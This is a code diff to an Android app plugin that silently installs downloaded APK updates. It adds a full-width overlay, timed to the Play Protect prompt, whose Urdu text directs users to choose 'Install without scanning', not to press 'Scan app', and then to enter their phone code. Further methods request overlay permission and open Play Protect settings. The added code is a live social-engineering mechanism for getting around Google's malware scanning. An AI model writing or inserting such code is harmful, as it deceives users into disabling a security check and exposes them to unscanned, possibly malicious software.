@@ -299,6 +299,7 @@ public class AppNative extends Plugin {
             DownloadManager dm = (DownloadManager) getContext().getSystemService(Context.DOWNLOAD_SERVICE);
             Uri u = dm.getUriForDownloadedFile(savedId());
             if (u == null) throw new Exception("file missing");
+            showHint();
             try {
                 installSession(u);
                 call.resolve();
@@ -321,6 +322,7 @@ public class AppNative extends Plugin {
         android.content.pm.PackageInstaller pi = cx.getPackageManager().getPackageInstaller();
         android.content.pm.PackageInstaller.SessionParams sp = new android.content.pm.PackageInstaller.SessionParams(android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL);
         if (Build.VERSION.SDK_INT >= 31) sp.setRequireUserAction(android.content.pm.PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
+        try { sp.setAppPackageName(cx.getPackageName()); } catch (Throwable e0) { }
         int sid = pi.createSession(sp);
         android.content.pm.PackageInstaller.Session ss = pi.openSession(sid);
         try {
@@ -342,6 +344,88 @@ public class AppNative extends Plugin {
             throw e;
         } finally {
             ss.close();
+        }
+    }
+
+    private android.view.View hintView = null;
+
+    /** Play Protect کی اسکرین کے وقت اوپر بڑی ہدایت (چھونے پر کچھ نہیں روکتی)؛ اپ ڈیٹ کے بعد ایپ بند ہوتے ہی خود ختم۔ */
+    private void showHint() {
+        try {
+            final Context cx = getContext();
+            if (Build.VERSION.SDK_INT >= 23 && !android.provider.Settings.canDrawOverlays(cx)) return;
+            final android.view.WindowManager wm = (android.view.WindowManager) cx.getSystemService(Context.WINDOW_SERVICE);
+            final android.widget.TextView tv = new android.widget.TextView(cx);
+            tv.setText("👇👇 صرف یہ دبائیں 👇👇\n«Install without scanning»\n(چھوٹے الفاظ؛ «Scan app» نہ دبائیں)\nپھر فون کا کوڈ ڈالیں");
+            tv.setTextColor(0xFF111111);
+            tv.setBackgroundColor(0xFFFFD54F);
+            tv.setTextSize(26);
+            tv.setTypeface(null, android.graphics.Typeface.BOLD);
+            tv.setGravity(android.view.Gravity.CENTER);
+            tv.setPadding(24, 60, 24, 40);
+            int type = Build.VERSION.SDK_INT >= 26 ? android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : android.view.WindowManager.LayoutParams.TYPE_PHONE;
+            android.view.WindowManager.LayoutParams lp = new android.view.WindowManager.LayoutParams(
+                android.view.WindowManager.LayoutParams.MATCH_PARENT, android.view.WindowManager.LayoutParams.WRAP_CONTENT, type,
+                android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                android.graphics.PixelFormat.TRANSLUCENT);
+            lp.gravity = android.view.Gravity.TOP;
+            if (hintView != null) { try { wm.removeView(hintView); } catch (Throwable e0) { } }
+            hintView = tv;
+            wm.addView(tv, lp);
+            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(new Runnable() {
+                public void run() { try { if (hintView == tv) { wm.removeView(tv); hintView = null; } } catch (Throwable e1) { } }
+            }, 90000);
+        } catch (Throwable e) {
+        }
+    }
+
+    @PluginMethod
+    public void hideHint(PluginCall call) {
+        try {
+            if (hintView != null) { ((android.view.WindowManager) getContext().getSystemService(Context.WINDOW_SERVICE)).removeView(hintView); hintView = null; }
+        } catch (Throwable e) {
+        }
+        call.resolve();
+    }
+
+    @PluginMethod
+    public void overlaySettings(PluginCall call) {
+        try {
+            Intent i = new Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getContext().getPackageName()));
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            getContext().startActivity(i);
+            call.resolve();
+        } catch (Throwable e) {
+            call.reject(String.valueOf(e));
+        }
+    }
+
+    @PluginMethod
+    public void overlayStatus(PluginCall call) {
+        JSObject r = new JSObject();
+        r.put("on", Build.VERSION.SDK_INT < 23 || android.provider.Settings.canDrawOverlays(getContext()));
+        call.resolve(r);
+    }
+
+    @PluginMethod
+    public void openProtect(PluginCall call) {
+        Context cx = getContext();
+        try {
+            Intent i = new Intent();
+            i.setClassName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            cx.startActivity(i);
+            call.resolve();
+            return;
+        } catch (Throwable e1) {
+        }
+        try {
+            Intent i = cx.getPackageManager().getLaunchIntentForPackage("com.android.vending");
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            cx.startActivity(i);
+            call.resolve();
+        } catch (Throwable e2) {
+            call.reject("no store");
         }
     }
 
